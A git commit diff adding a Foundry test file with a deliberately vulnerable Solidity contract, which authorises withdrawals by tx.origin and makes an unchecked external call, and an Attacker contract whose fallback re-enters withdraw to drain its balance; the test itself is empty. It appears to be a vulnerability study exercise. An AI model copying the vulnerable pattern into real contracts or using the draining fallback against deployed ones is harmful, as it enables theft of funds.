66efc5984636e53f90219e3ef2620701adc0cca8
rayquaza7 <sarhaangulati737@gmail.com>
2022-07-31 20:45:14 -0700

    init

--- test/Contract.t.sol
+++ test/Contract.t.sol
@@ -4,9 +4,46 @@ pragma solidity ^0.8.13;
 import "forge-std/Test.sol";
 
 contract ContractTest is Test {
-    function setUp() public {}
+    Contract ctr;
+    Attacker attacker;
 
-    function testExample() public {
-        assertTrue(true);
+    function setUp() public {
+        ctr = new Contract();
+        vm.deal(address(ctr), 100);
+
+        attacker = new Attacker(address(ctr));
+
+        ctr.withdraw(address(attacker), 10);
+    }
+
+    function testVuln() public {}
+}
+
+contract Contract is Test {
+    address public owner;
+
+    constructor() {
+        owner = tx.origin;
+    }
+
+    function withdraw(address to, uint256 amount) public {
+        require(tx.origin == owner, "no");
+        console.log("entry");
+        (bool success, ) = to.call{value: amount}("");
+    }
+}
+
+contract Attacker is Test {
+    Contract ctr;
+    address attacker;
+
+    constructor(address _ctr) {
+        ctr = Contract(_ctr);
+        attacker = msg.sender;
+    }
+
+    fallback() external payable {
+        if (msg.sender.balance == 0) return;
+        ctr.withdraw(address(this), msg.sender.balance);
     }
 }
